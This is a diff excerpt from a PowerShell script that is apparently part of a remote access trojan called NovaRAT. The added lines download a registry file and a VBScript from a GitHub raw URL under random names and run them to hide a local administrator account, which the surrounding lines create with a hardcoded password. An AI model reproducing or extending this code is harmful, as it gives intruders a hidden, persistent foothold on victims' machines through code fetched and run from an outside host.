@@ -30,7 +30,15 @@ $pword = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 #registry to hide local admin
+$reg_file = random_text
+Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/admin.reg -OutFile "$reg_file.reg"
 
+#visual basic script to register the registry
+$vbs_file = random_text
+Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+
+#install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
 
 ## variables
 $wd = random_text
